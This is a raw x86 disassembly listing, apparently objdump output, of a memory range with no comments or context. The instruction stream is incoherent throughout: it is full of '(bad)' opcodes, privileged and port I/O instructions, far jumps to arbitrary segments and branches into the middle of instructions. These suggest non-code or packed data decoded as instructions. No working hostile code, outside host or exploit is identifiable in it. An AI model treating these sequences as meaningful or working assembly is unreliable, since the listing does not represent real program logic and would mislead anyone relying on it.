  41fe22:	pop    es
  41fe23:	mov    ds:0x3a77ea89,al
  41fe28:	fwait
  41fe29:	leave  
  41fe2a:	xchg   ebp,eax
  41fe2b:	loop   0x41fdf5
  41fe2d:	dec    edi
  41fe2e:	addr16 sbb esp,eax
  41fe31:	iret   
  41fe32:	pop    esp
  41fe33:	mov    esp,0x817e0bb1
  41fe38:	nop
  41fe39:	jne    0x41fdf9
  41fe3b:	cs (bad) 
  41fe3d:	pop    esp
  41fe3e:	aas    
  41fe3f:	xchg   ebx,eax
  41fe40:	pushf  
  41fe41:	lods   eax,DWORD PTR ds:[esi]
  41fe42:	mov    esp,?
  41fe44:	inc    eax
  41fe45:	daa    
  41fe46:	retf   0xd1fe
  41fe49:	inc    ecx
  41fe4a:	pop    eax
  41fe4b:	jecxz  0x41fea8
  41fe4d:	dec    eax
  41fe4e:	pop    ss
  41fe4f:	pop    ebx
  41fe50:	inc    esp
  41fe51:	push   0x968a196d
  41fe56:	scas   eax,DWORD PTR es:[edi]
  41fe57:	sahf   
  41fe58:	xor    ebp,DWORD PTR [ebx-0xc]
  41fe5b:	xlat   BYTE PTR ds:[ebx]
  41fe5c:	test   DWORD PTR [esi],esi
  41fe5e:	fisttp WORD PTR [ebx*8-0xb76cc57]
  41fe65:	sub    DWORD PTR ss:[eax+0x562dc8f3],ebp
  41fe6c:	lock in eax,dx
  41fe6e:	push   esi
  41fe6f:	jns    0x41fec1
  41fe71:	mov    ebp,0xdab4edb8
  41fe76:	int    0xc4
  41fe78:	and    BYTE PTR [eax-0x4f],dh
  41fe7b:	(bad)  
  41fe7d:	sbb    eax,0x5dd7fe28
  41fe82:	jo     0x41fe06
  41fe84:	daa    
  41fe85:	xchg   edx,eax
  41fe86:	mov    edi,0x2d28545a
  41fe8b:	jecxz  0x41fec1
  41fe8d:	in     al,0xd5
  41fe8f:	frstor [ebp+ecx*2-0x67f70094]
  41fe96:	es js  0x41fe40
  41fe99:	add    ah,ch
  41fe9b:	xchg   DWORD PTR [edi],esp
  41fe9d:	mov    ebp,0x2802f95c
  41fea2:	push   0xffffffaf
  41fea4:	int3   
  41fea5:	cmp    dl,BYTE PTR [ebx-0x51]
  41fea8:	push   ecx
  41fea9:	icebp  
  41feaa:	xor    al,BYTE PTR [edx-0x2198b322]
  41feb0:	fimul  DWORD PTR [esi+0x45bb2774]
  41feb6:	and    bl,bl
  41feb8:	js     0x7ce418e4
  41febe:	iret   
  41febf:	push   esi
  41fec0:	adc    ebp,ebp
  41fec2:	ror    BYTE PTR ds:0x5cfdebea,1
  41fec8:	mov    edx,0xdfefc0c5
  41fecd:	xchg   ecx,eax
  41fece:	test   eax,0x3cd9cf60
  41fed3:	mov    dh,0x63
  41fed5:	cmp    al,0x19
  41fed7:	(bad)
  41feda:	or     DWORD PTR [edx-0x6288f486],0xffffff90
  41fee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fee2:	(bad)  
  41fee3:	popa   
  41fee4:	mov    ah,0xe2
  41fee6:	add    eax,0x112543a6
  41feeb:	inc    ebp
  41feec:	cmp    eax,0xf61ace9e
  41fef1:	shl    DWORD PTR [ecx-0x60979485],1
  41fef7:	jle    0x41ff33
  41fef9:	jge    0x41fedb
  41fefb:	mov    eax,ds:0x31c123c8
  41ff00:	not    dh
  41ff02:	xor    DWORD PTR [esi+0x67],0x7f
  41ff06:	dec    eax
  41ff07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff08:	icebp  
  41ff09:	add    eax,0xa4af18da
  41ff0e:	enter  0xcd46,0xf0
  41ff12:	cmp    ebp,DWORD PTR cs:[ebp+0x63c6caba]
  41ff19:	mov    DWORD PTR [edx],esp
  41ff1b:	mov    edi,0xe6760860
  41ff20:	add    dh,dh
  41ff22:	aaa    
  41ff23:	jl     0x41ff5a
  41ff25:	dec    edi
  41ff26:	idiv   DWORD PTR [esi-0x1]
  41ff29:	ror    BYTE PTR [esi-0x59],0xcb
  41ff2d:	fiadd  WORD PTR [ecx]
  41ff2f:	push   0x9867bd13
  41ff34:	add    BYTE PTR [esi-0x62000f14],bl
  41ff3a:	sbb    dh,BYTE PTR [ebx-0x56]
  41ff3d:	push   edi
  41ff3e:	idiv   DWORD PTR [edi-0x57]
  41ff41:	cmovs  ebp,DWORD PTR [esi+0x6cdad5b8]
  41ff48:	adc    edx,edx
  41ff4a:	pop    ebp
  41ff4b:	adc    ch,BYTE PTR [ebx+0x6b]
  41ff4e:	push   es
  41ff4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff50:	test   al,0x40
  41ff52:	push   ds
  41ff53:	inc    ecx
  41ff54:	jbe    0x41ff8e
  41ff56:	stos   DWORD PTR es:[edi],eax
  41ff57:	imul   esp,DWORD PTR [edi+0x75370083],0xc7a02b4b
  41ff61:	push   esp
  41ff62:	mov    cl,0x33
  41ff64:	fs dec edx
  41ff66:	mov    ebp,0x540fffe0
  41ff6b:	sbb    bl,bh
  41ff6d:	test   BYTE PTR [eax-0x2341fbcb],0xf9
  41ff74:	pop    ebp
  41ff75:	arpl   WORD PTR [edx],dx
  41ff77:	daa    
  41ff78:	ficomp WORD PTR [ecx-0xf434c09]
  41ff7e:	pop    edi
  41ff7f:	sub    al,al
  41ff81:	hlt    
  41ff82:	ret    0xe1ee
  41ff85:	adc    eax,0xdcabfb1
  41ff8a:	jbe    0x42000b
  41ff8c:	jg     0x41ff86
  41ff8e:	fsubp  st(3),st
  41ff90:	xor    DWORD PTR [ebp+0x2f],edx
  41ff93:	iret   
  41ff94:	xor    bh,0xc4
  41ff97:	imul   BYTE PTR [edx]
  41ff99:	(bad)  
  41ff9a:	outs   dx,DWORD PTR ds:[esi]
  41ff9b:	aaa    
  41ff9c:	pop    esi
  41ff9d:	sbb    eax,0x5bfbe64b
  41ffa2:	test   eax,0x2afee0f4
  41ffa7:	fstp   TBYTE PTR [eax-0x2bcf00f]
  41ffad:	or     bl,BYTE PTR [ebx]
  41ffaf:	(bad)  
  41ffb0:	in     al,dx
  41ffb1:	mov    esp,DWORD PTR [esi]
  41ffb3:	and    al,0xe0
  41ffb5:	sti    
  41ffb6:	daa    
  41ffb7:	call   0x6f675884
  41ffbc:	mov    ebp,0x19adb637
  41ffc1:	and    ch,dl
  41ffc3:	mov    ecx,0x581a874d
  41ffc8:	xchg   ch,bl
  41ffca:	fist   DWORD PTR [esi+edx*4]
  41ffcd:	out    dx,al
  41ffce:	pop    es
  41ffcf:	fsub   DWORD PTR [eax-0x343f38bd]
  41ffd5:	cmp    DWORD PTR [ebx+edx*2-0x45],ecx
  41ffd9:	cli    
  41ffda:	and    ah,BYTE PTR [esi]
  41ffdc:	inc    esp
  41ffdd:	mov    dl,0x64
  41ffdf:	xchg   edx,eax
  41ffe0:	rcr    dl,0x5
  41ffe3:	cs dec ebx
  41ffe5:	cmp    edx,0x13
  41ffe8:	aas    
  41ffe9:	(bad)  [eax]
  41ffeb:	xchg   DWORD PTR [edi+esi*1],eax
  41ffee:	popa   
  41ffef:	lea    edi,[ecx+0x2d]
  41fff2:	cmp    eax,0x2f8b4b83
  41fff7:	sub    al,0xb7
  41fff9:	cld    
  41fffa:	dec    edi
  41fffb:	fist   DWORD PTR ds:0x6bfd9436
  420001:	in     al,dx
  420002:	jno    0x41ffe2
  420004:	add    ebp,DWORD PTR [edx+0x47dd4539]
  42000a:	jo     0x41ffa5
  42000c:	push   esi
  42000d:	push   edi
  42000e:	rcl    DWORD PTR [ecx-0x6bf5b20c],cl
  420014:	(bad)  
  420016:	inc    ebx
  420017:	shl    bl,1
  420019:	jmp    0xc894848e
  42001e:	mov    ah,BYTE PTR [edx]
  420020:	ins    DWORD PTR es:[edi],dx
  420021:	test   bh,cl
  420023:	loopne 0x420023
  420025:	cmp    ch,bh
  420027:	mov    bh,0x70
  420029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42002a:	jl     0x41ffeb
  42002c:	mov    WORD PTR [edi-0x3a],ds
  42002f:	xchg   edi,eax
  420030:	call   ecx
  420032:	outs   dx,DWORD PTR ds:[esi]
  420033:	sbb    DWORD PTR [ebx],ecx
  420035:	push   ebp
  420036:	pop    esp
  420037:	push   ds
  420038:	imul   edx,DWORD PTR [eax+0x8],0x95200325
  42003f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420040:	add    esi,DWORD PTR [edx-0x528f0d7]
  420046:	cmp    al,0x26
  420048:	add    BYTE PTR [ebx+0x23a5e3b3],ch
  42004e:	xchg   DWORD PTR [eax-0x24d25b5d],edi
  420054:	add    DWORD PTR [edi],ebx
  420056:	pop    ebp
  420057:	fcomp  st(3)
  420059:	mov    esi,0xc3720c03
  42005e:	and    al,al
  420060:	mov    al,BYTE PTR [eax-0x79e04ee0]
  420066:	loopne 0x4200cc
  420068:	inc    ebx
  420069:	mov    ?,WORD PTR [edx+0x5]
  42006c:	and    esi,DWORD PTR [ebp-0x5]
  42006f:	out    0xe2,al
  420071:	lock inc esi
  420073:	dec    esi
  420074:	ret    0xd62d
  420077:	lods   eax,DWORD PTR ds:[esi]
  420078:	mov    ds:0x22bda19a,al
  42007d:	call   0x7a74:0xbd18d67d
  420084:	push   edx
  420085:	xor    BYTE PTR [edx-0x17],al
  420088:	push   edx
  420089:	fdiv   DWORD PTR [edi+0x78bf6dd8]
  42008f:	jge    0x4200d7
  420091:	jmp    0x4200a3
  420093:	int    0x69
  420095:	data16 cmp al,ch
  420098:	or     al,0xad
  42009a:	jb     0x42008e
  42009c:	loope  0x42002a
  42009e:	loopne 0x4200ce
  4200a0:	push   0x933ca7b5
  4200a5:	adc    al,0xca
  4200a7:	retf   0xbb88
  4200aa:	icebp  
  4200ab:	pop    ecx
  4200ac:	mov    es,WORD PTR ds:0xd8547435
  4200b2:	mov    dh,0x51
  4200b4:	mov    al,ds:0xcad5e0e5
  4200b9:	or     al,0xa5
  4200bb:	in     al,0x4b
  4200bd:	dec    ebp
  4200be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200bf:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4200c1:	(bad)  
  4200c2:	push   ecx
  4200c3:	xor    eax,0x2d9c4adc
  4200c8:	ja     0x42005b
  4200ca:	adc    ebx,DWORD PTR [edx]
  4200cc:	imul   ecx,DWORD PTR [edi-0x29],0xffffff89
  4200d0:	or     BYTE PTR [edi+ebx*4],bh
  4200d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200d4:	inc    edi
  4200d5:	ret    
  4200d6:	mov    ch,0xb1
  4200d8:	mov    BYTE PTR [esi+0x437d3ed4],0x7d
  4200df:	mov    ch,BYTE PTR ds:0xb893cf97
  4200e5:	imul   ebx,eax,0xfffffffb
  4200e8:	jmp    0x4200c3
  4200ea:	repnz in eax,0xdc
  4200ed:	mov    al,0x92
  4200ef:	sub    DWORD PTR [ecx-0x781bdce3],0xabc634ac
  4200f9:	xor    eax,0xfb53cc93
  4200fe:	jo     0x420132
  420100:	inc    esi
  420101:	out    0xa1,eax
  420103:	ret    0x28ea
  420106:	sbb    esi,DWORD PTR [ebx+0x3]
  420109:	inc    eax
  42010a:	sub    cl,al
  42010c:	lods   eax,DWORD PTR ds:[esi]
  42010d:	popa   
  42010e:	outs   dx,DWORD PTR ds:[esi]
  42010f:	mov    cl,0x8c
  420111:	imul   DWORD PTR [eax-0x6fd7c57]
  420117:	outs   dx,DWORD PTR ds:[esi]
  420118:	shld   ebp,esi,0x4
  42011c:	pop    ss
  42011d:	and    ebx,DWORD PTR [ecx-0x22513caa]
  420123:	aam    0xf5
  420125:	(bad)
  420128:	stc    
  420129:	inc    esi
  42012a:	enter  0xd2cd,0x63
  42012e:	(bad)  
  42012f:	lahf   
  420130:	push   ebp
  420131:	xchg   BYTE PTR [esi+0x3ad58bde],bl
  420137:	jg     0x4200de
  420139:	imul   ecx,esp,0xfffffff7
  42013c:	shl    BYTE PTR [esi],1
  42013e:	dec    ecx
  42013f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420140:	jp     0x4201a9
  420142:	outs   dx,DWORD PTR ds:[esi]
  420143:	mov    ecx,0x542649bc
  420148:	jmp    0x77ba:0xd410a2aa
  42014f:	lods   eax,DWORD PTR ds:[esi]
  420150:	push   0x7f
  420152:	or     bl,bh
  420154:	inc    ebx
  420155:	adc    bh,dh
  420157:	mov    bh,0x33
  420159:	mov    edi,ss
  42015b:	enter  0x7da1,0xb0
  42015f:	jne    0x42011c
  420161:	les    esp,FWORD PTR [edi]
  420163:	dec    esp
  420164:	in     eax,dx
  420165:	cs retf 0x3a09
  420169:	nop    DWORD PTR fs:[ecx+0x37]
  42016e:	mov    esp,0x87454614
  420173:	pop    esp
  420174:	mov    dh,0x5b
  420176:	cmp    BYTE PTR [ecx+ebp*1-0x577171e2],bh
  42017d:	add    al,0x1f
  42017f:	pusha  
  420180:	add    DWORD PTR gs:[esi],eax
  420183:	shl    DWORD PTR [ebx+0x1],1
  420186:	push   ebp
  420187:	je     0x4201bb
  420189:	xor    edi,edi
  42018b:	push   esi
  42018c:	pop    edx
  42018d:	jl     0x420197
  42018f:	stos   BYTE PTR es:[edi],al
  420190:	aad    0xfa
  420192:	mov    bl,0x2e
  420194:	cwde   
  420195:	(bad)  
  420196:	cwde   
  420197:	aas    
  420198:	push   eax
  420199:	rol    DWORD PTR [ecx+0x3e],0x85
  42019d:	cli    
  42019e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42019f:	jl     0x4201b2
  4201a1:	jbe    0x42021e
  4201a3:	icebp  
  4201a4:	das    
  4201a5:	inc    esp
  4201a6:	sub    ecx,ebp
  4201a8:	jo     0x42012c
  4201aa:	pop    ds
  4201ab:	mov    al,ds:0xd2138603
  4201b0:	sub    DWORD PTR [eax-0x31],ebp
  4201b3:	ss sbb eax,0xaaa7e41b
  4201b9:	mov    ebx,0x1056fc22
  4201be:	test   DWORD PTR [ebp+0x1d],eax
  4201c1:	mov    al,0xc5
  4201c3:	cmp    ch,dh
  4201c5:	sub    BYTE PTR [edi+0x2948b311],0xed
  4201cc:	and    ch,ch
  4201ce:	jmp    0x22ddee0
  4201d3:	jno    0x4201f1
  4201d5:	mov    al,cs:0x912c9afc
  4201db:	lea    esi,ds:0x9093afb
  4201e1:	and    BYTE PTR [eax],dh
  4201e3:	test   BYTE PTR [edi-0xc4ff0f8],cl
  4201e9:	mov    ds:0xa8416cb,eax
  4201ee:	imul   ebp,DWORD PTR [ebx+0x646bd08a],0x8e85b932
  4201f8:	mov    ch,0xeb
  4201fa:	js     0x42026a
  4201fc:	sti    
  4201fd:	fcmovb st,st(7)
  4201ff:	pop    ecx
  420200:	or     BYTE PTR ds:0xf87c3628,al
  420206:	shl    BYTE PTR [ecx],0x89
  420209:	mov    ds:0xab474202,al
  42020e:	loopne 0x42021a
  420210:	retf   
  420211:	stos   DWORD PTR es:[edi],eax
  420212:	sub    al,dl
  420214:	xor    DWORD PTR [esi-0x66],0xf0bfe64f
  42021b:	das    
  42021c:	aaa    
  42021d:	push   edx
  42021e:	enter  0x918,0xb8
  420222:	sub    ebx,edi
  420224:	push   ecx
  420225:	xchg   ecx,eax
  420226:	les    edi,FWORD PTR [edi]
  420228:	dec    DWORD PTR [edi+0x192663a0]
  42022e:	add    eax,0xb5a11ac
  420233:	dec    edx
  420234:	xchg   edx,eax
  420235:	lahf   
  420236:	lea    ecx,[ebx+0x211770ea]
  42023c:	or     al,0xab
  42023e:	es aad 0x9c
  420241:	sub    al,0xe7
  420243:	jecxz  0x420268
  420245:	jns    0x420205
  420247:	hlt    
  420248:	shr    DWORD PTR [ebp+0x4b],cl
  42024b:	xor    al,0x66
  42024d:	mov    DWORD PTR [edi+eiz*4-0x26],edx
  420251:	or     al,0xe5
  420253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420254:	cmp    ebx,DWORD PTR [edx]
  420256:	push   esi
  420257:	mov    ch,0x5d
  420259:	shl    DWORD PTR [ebp+0x126765d4],1
  42025f:	shl    BYTE PTR [esi],0xf5
  420262:	popa   
  420263:	outs   dx,DWORD PTR ds:[esi]
  420264:	jmp    0x4201ff
  420266:	cmp    BYTE PTR [edi-0x44d824b5],ah
  42026c:	and    eax,0x1b460491
  420271:	and    edi,DWORD PTR [ecx]
  420273:	mov    eax,ds:0xd3f99942
  420278:	fwait
  420279:	aas    
  42027a:	dec    edx
  42027b:	mov    ebx,0x6d212e1a
  420280:	rol    DWORD PTR [esi+0x12],cl
  420283:	push   ecx
  420284:	push   ecx
  420285:	(bad)  [esi+0x39833e4a]
  42028b:	das    
  42028c:	adc    esp,DWORD PTR [edi]
  42028e:	push   ecx
  42028f:	xor    edi,DWORD PTR [edi+0xd]
  420292:	outs   dx,BYTE PTR ds:[esi]
  420294:	jmp    0xb4bc:0x410a7fe2
  42029b:	stos   DWORD PTR es:[edi],eax
  42029c:	jno    0x420239
  42029e:	pusha  
  42029f:	push   0x6f
  4202a1:	and    ebp,DWORD PTR fs:[ebx+0x27]
  4202a5:	std    
  4202a6:	or     bl,al
  4202a8:	and    al,BYTE PTR [edi+edx*8]
  4202ab:	fld    TBYTE PTR [edx+0x69846f43]
  4202b1:	(bad)  
  4202b2:	fsub   DWORD PTR [edi+ebp*8+0x37f040eb]
  4202b9:	push   cs
  4202ba:	dec    ebp
  4202bb:	or     DWORD PTR [ebx-0x46ad91cb],edx
  4202c1:	xchg   ebp,eax
  4202c2:	jo     0x420251
  4202c4:	xchg   ebx,eax
  4202c5:	shl    BYTE PTR [edi-0x438a1f0],0x7
  4202cc:	icebp  
  4202cd:	(bad)  
  4202ce:	add    eax,0xc37bfc27
  4202d3:	ror    al,1
  4202d5:	ja     0x4202a3
  4202d7:	mov    cs,WORD PTR [edx]
  4202d9:	jnp    0x42028d
  4202db:	pop    esp
  4202dc:	sub    ah,ch
  4202de:	repz adc al,0x35
  4202e1:	(bad)  ds:0x8d648301
  4202e7:	inc    ebx
  4202e8:	inc    edx
  4202e9:	add    eax,0x9e7473bc
  4202ee:	mov    esi,0x64eb1ba6
  4202f3:	aas    
  4202f4:	ret    0x5b0e
  4202f7:	and    esp,DWORD PTR [edi-0x4350d83d]
  4202fd:	pop    eax
  4202fe:	hlt    
  4202ff:	xor    al,0xc2
  420301:	cwde   
  420302:	jmp    0xf0665626
  420307:	pop    edx
  420308:	mov    edx,0xa973d38d
  42030d:	jo     0x42036a
  42030f:	and    esp,DWORD PTR [edx+0x48b597e1]
  420315:	sub    BYTE PTR [edx+0x23],0xbe
  420319:	xor    cl,BYTE PTR [ebp-0x23]
  42031c:	fwait
  42031d:	mov    al,ds:0xaa7a68e5
  420322:	stos   DWORD PTR es:[edi],eax
  420323:	in     eax,dx
  420324:	jp     0x420351
  420326:	sbb    edi,ebp
  420328:	push   eax
  420329:	jo     0x420356
  42032b:	call   0x553f:0xe11369f
  420332:	mov    bl,0x90
  420334:	imul   edx,DWORD PTR [eax],0x66ba4c7e
  42033a:	stos   DWORD PTR es:[edi],eax
  42033b:	xchg   DWORD PTR [ebp+0x1c],edi
  42033e:	sub    DWORD PTR [esp+edi*1-0x100cb23d],esp
  420345:	pop    ss
  420346:	iret   
  420347:	scas   eax,DWORD PTR es:[edi]
  420348:	add    DWORD PTR gs:[ecx-0x56],edi
  42034c:	mov    DWORD PTR [ebp+0x18bde022],ebx
  420352:	sub    edi,DWORD PTR [esp+ebx*1-0x80]
  420356:	jb     0x4202d9
  420358:	add    ebx,DWORD PTR [eax]
  42035a:	mov    ebx,0x72987ea3
  42035f:	in     al,0x36
  420361:	sbb    BYTE PTR [edx+ebx*2-0x35],dh
  420365:	ds inc esp
  420367:	or     ecx,DWORD PTR [ebp-0x7f32505e]
  42036d:	dec    ebx
  42036e:	ret    
  42036f:	add    al,0xcd
  420371:	pop    edx
  420372:	xor    esp,DWORD PTR [edx-0x25887027]
  420378:	outs   dx,BYTE PTR ds:[esi]
  420379:	loopne 0x420386
  42037b:	pop    edx
  42037c:	rol    DWORD PTR [ecx+0x56182cab],0x52
  420383:	ins    DWORD PTR es:[edi],dx
  420384:	pushf  
  420385:	push   0xa5dbd75d
  42038a:	add    eax,0x9d8995d3
  42038f:	jbe    0x4203db
  420391:	enter  0x55bb,0x9a
  420395:	imul   ebp,DWORD PTR [esi],0xffffffc4
  420398:	pushf  
  420399:	xchg   esp,eax
  42039a:	(bad)  
  42039b:	call   0x85df21e3
  4203a0:	iret   
  4203a1:	pop    edi
  4203a2:	lea    edi,[ecx]
  4203a4:	gs xchg ebx,eax
  4203a6:	out    dx,eax
  4203a7:	nop
  4203a8:	(bad)  
  4203a9:	icebp  
  4203aa:	jmp    0xe9fb:0xeb3c2fc3
  4203b1:	jl     0x4203b3
  4203b3:	push   0x24dd113f
  4203b8:	(bad)  
  4203b9:	mov    ebx,0x5c8500f5
  4203be:	mov    al,ds:0x34c88a7
  4203c3:	xchg   DWORD PTR [ebx+0x3b],eax
  4203c6:	cld    
  4203c7:	daa    
  4203c8:	aad    0xef
  4203ca:	shl    DWORD PTR [eax+0x3d3af1b4],0xe8
  4203d1:	ins    BYTE PTR es:[edi],dx
  4203d2:	xchg   esi,eax
  4203d3:	sbb    DWORD PTR [edi+0xa],esp
  4203d6:	sub    BYTE PTR [ebx],ch
  4203d8:	(bad)  
  4203d9:	adc    edx,DWORD PTR [esi]
  4203db:	jecxz  0x420446
  4203dd:	jmp    0x42044c
  4203df:	das    
  4203e0:	xchg   DWORD PTR [ebx],eax
  4203e2:	adc    eax,0x865a18d8
  4203e7:	fwait
  4203e8:	xor    ebx,DWORD PTR [ecx-0x6cd23b5d]
  4203ee:	inc    BYTE PTR [edx+0x40febbe5]
  4203f4:	xor    eax,0xcb22cffa
  4203f9:	or     BYTE PTR [edi],dl
  4203fb:	xor    DWORD PTR ds:0x8733fe62,esp
  420401:	xchg   edi,eax
  420402:	jmp    0x420389
  420404:	loope  0x4203bc
  420406:	xchg   edi,eax
  420407:	inc    ebp
  420408:	xchg   ebx,eax
  420409:	ja     0x4203dc
  42040b:	jge    0x42043a
  42040d:	pop    edi
  42040e:	jmp    0x88621203
  420413:	call   0xf9cb:0xf2b69d97
  42041a:	adc    dh,dh
  42041c:	mov    ch,0xc9
  42041e:	xchg   edi,eax
  42041f:	lahf   
  420420:	cmp    edi,DWORD PTR [edx+0x7ba6608b]
  420426:	cmp    bl,BYTE PTR [edi+edi*8-0xf]
  42042a:	xor    eax,0x6429cbae
  42042f:	aad    0xd8
  420431:	ds mov bh,0x32
  420434:	xchg   dl,cl
  420436:	mov    ds:0xf4dace9c,al
  42043b:	xor    BYTE PTR [ebx+0x4],ch
  42043e:	xchg   ebx,eax
  42043f:	mov    BYTE PTR [edx],dl
  420441:	popf   
  420442:	ja     0x420417
  420444:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420445:	std    
  420446:	(bad)  
  420447:	mov    ebx,0xd6b76cfb
  42044c:	sbb    ebp,esp
  42044e:	mov    WORD PTR [eax+0x21],?
  420451:	lea    edx,[edi]
  420453:	dec    ecx
  420454:	ret    
  420455:	push   eax
  420456:	fld    QWORD PTR [esp+edi*8+0x3441a6b1]
  42045d:	and    esi,0xa79d1e67
  420463:	sti    
  420464:	(bad)  
  420465:	sahf   
  420466:	inc    edi
  420467:	(bad)  
  420468:	std    
  420469:	mov    esi,0x1f19d18c
  42046e:	mov    al,0x7f
  420470:	shr    BYTE PTR [esi+0x7c],cl
  420473:	rcr    BYTE PTR [esi-0x67],0xad
  420477:	inc    edx
  420478:	mov    cl,0xf
  42047a:	imul   edi,DWORD PTR [ecx+ebp*4],0xb4318c66
  420481:	dec    esp
  420482:	imul   esi,ebx,0x30
  420485:	xchg   BYTE PTR [bx-0x3b],al
  420489:	lds    esi,FWORD PTR [edi]
  42048b:	bnd call 0xd6c5bbc6
  420491:	add    DWORD PTR [ebx],ebp
  420493:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420494:	mov    ds:0xd9d8c7eb,al
  420499:	out    dx,eax
  42049a:	icebp  
  42049b:	mov    cl,0xbf
  42049d:	add    DWORD PTR [edx+0x73cd3808],0x51b996a3
  4204a7:	ins    DWORD PTR es:[edi],dx
  4204a8:	jns    0x42042a
  4204aa:	jmp    0xda59eaa3
  4204af:	adc    eax,0xe305b7e
  4204b4:	fwait
  4204b5:	adc    bh,bh
  4204b7:	xor    BYTE PTR es:[eax-0x7e33aaed],bl
  4204be:	test   eax,esp
  4204c0:	ret    0xc8be
  4204c3:	stc    
  4204c4:	popa   
  4204c5:	jge    0x420483
  4204c7:	enter  0xadb7,0xba
  4204cb:	arpl   WORD PTR [eax],sp
  4204cd:	(bad)  
  4204ce:	popf   
  4204cf:	lea    ebx,[ebp-0x30]
  4204d2:	jg     0x42050c
  4204d4:	aad    0x2d
  4204d6:	adc    BYTE PTR [esp+ecx*4],dh
  4204d9:	in     al,0x3a
  4204db:	cmp    dl,BYTE PTR [ecx+0x27]
  4204de:	xchg   edx,eax
  4204df:	xor    al,0x82
  4204e1:	adc    eax,0xc2c26eb5
  4204e6:	jmp    0x138ecc98
  4204eb:	add    BYTE PTR [ebx],0x84
  4204ee:	out    dx,eax
  4204ef:	es aam 0xf0
  4204f2:	pop    edi
  4204f3:	jmp    0xbe4b5757
  4204f8:	ret    
  4204f9:	pop    ecx
  4204fa:	push   cs
  4204fb:	cli    
  4204fc:	jae    0x4204b4
  4204fe:	lahf   
  4204ff:	add    cl,BYTE PTR [ecx-0x63]
  420502:	jl     0x420495
  420504:	push   esi
  420505:	sbb    edi,DWORD PTR [eax+0x5efecd8]
  42050b:	aam    0x79
  42050d:	adc    ecx,0x778154bf
  420513:	sbb    ebx,ebp
  420515:	les    esi,FWORD PTR [ebx+0x29]
  420518:	cmp    al,0x9
  42051a:	xor    al,0x1a
  42051c:	ins    DWORD PTR es:[edi],dx
  42051d:	adc    eax,0x84fa3e2c
  420522:	fs mov bh,0xef
  420525:	or     cl,bh
  420527:	adc    eax,0xc286b488
  42052c:	add    dl,BYTE PTR [edi]
  42052e:	mov    cl,0xc1
  420530:	mov    edi,0xdff9e1d4
  420535:	and    BYTE PTR [eax-0x3b],al
  420538:	cmp    al,BYTE PTR [ebx+0x7f126657]
  42053e:	cmp    BYTE PTR [ebx],bh
  420540:	xchg   ebp,eax
  420541:	pop    ebp
  420542:	inc    ecx
  420543:	loopne 0x420501
  420545:	loop   0x420527
  420547:	jmp    0x53c31e9
  42054c:	cmp    DWORD PTR [ecx],edx
  42054e:	stos   BYTE PTR es:[edi],al
  42054f:	jno    0x420519
  420551:	ss es cmp al,0x33
  420555:	mov    eax,0x81032812
  42055a:	push   ebp
  42055b:	clc    
  42055c:	sub    ebx,edi
  42055e:	hlt    
  42055f:	ucomiss xmm2,DWORD PTR [ebx+0x4a]
  420563:	and    ah,cl
  420565:	xor    al,0xb8
  420567:	ss push 0xf5479363
  42056d:	add    bh,cl
  42056f:	dec    ebx
  420570:	(bad)  [ecx-0x14c80ff4]
  420576:	stc    
  420577:	imul   ecx,DWORD PTR [ecx+0x4396eafe],0xdc1e14cf
  420581:	into   
  420582:	test   ecx,edx
  420584:	mov    dh,0xc1
  420586:	stc    
  420587:	je     0x420566
  420589:	icebp  
  42058a:	push   0x9
  42058c:	mov    bh,0xf7
  42058e:	shl    DWORD PTR [eax+0x5c33d0c3],cl
  420594:	push   ebx
  420595:	imul   DWORD PTR [ecx]
  420597:	mov    es,WORD PTR ds:0x21fcecce
  42059d:	xchg   ebx,eax
  42059e:	xchg   DWORD PTR [ebp-0x57aa8659],edx
  4205a4:	cmp    eax,0xae438d93
  4205a9:	shl    DWORD PTR [ebx+0x78],cl
  4205ac:	fist   WORD PTR [ecx-0x1b3f576c]
  4205b2:	and    esi,DWORD PTR [edx+0x10]
  4205b5:	and    al,0xa2
  4205b7:	push   es
  4205b8:	or     eax,0xb6c28ff7
  4205bd:	loopne 0x42060c
  4205bf:	push   ds
  4205c0:	mov    DWORD PTR [esi-0x7c69ffaa],eax
  4205c6:	mov    bl,0xba
  4205c8:	rcr    DWORD PTR [edx],1
  4205ca:	jae    0x4205b0
  4205cc:	and    al,0xf8
  4205ce:	and    eax,0xd7b6fe23
  4205d3:	paddusb mm2,QWORD PTR [edx]
  4205d6:	push   esp
  4205d7:	jb     0x420649
  4205d9:	mov    ah,BYTE PTR [ebx+0x141d869a]
  4205df:	test   al,0x86
  4205e1:	nop
  4205e2:	push   cs
  4205e3:	cld    
  4205e4:	pop    esp
  4205e5:	mov    DWORD PTR [edx+0x198af8bc],0x36868378
  4205ef:	in     al,dx
  4205f0:	mov    ebp,0x510931be
  4205f5:	repz aas 
  4205f7:	and    esp,DWORD PTR [ebx-0x5]
  4205fa:	xchg   ecx,eax
  4205fb:	dec    ecx
  4205fc:	test   al,0x65
  4205fe:	xor    eax,0x3b6e0eae
  420603:	push   ebp
  420604:	lods   al,BYTE PTR ds:[esi]
  420605:	lea    eax,[ecx]
  420607:	xchg   ecx,eax
  420608:	sbb    DWORD PTR [edx-0x7c],0x5d842a65
  42060f:	aaa    
  420610:	(bad)  
  420611:	ins    BYTE PTR es:[edi],dx
  420612:	gs mov bl,0x7c
  420615:	aad    0xbd
  420617:	cmp    ax,0xa56e
  42061b:	pop    ecx
  42061c:	mov    bl,0x9e
  42061e:	into   
  42061f:	out    0xc9,al
  420621:	jo     0x42063f
  420623:	div    DWORD PTR [ecx]
  420625:	cdq    
  420626:	sar    BYTE PTR [esi+0x7056e77b],cl
  42062c:	sub    esp,DWORD PTR [ebx-0x3a069538]
  420632:	enter  0x161,0x73
  420636:	xchg   edi,eax
  420637:	cld    
  420638:	xor    cl,BYTE PTR [ecx+ebp*1]
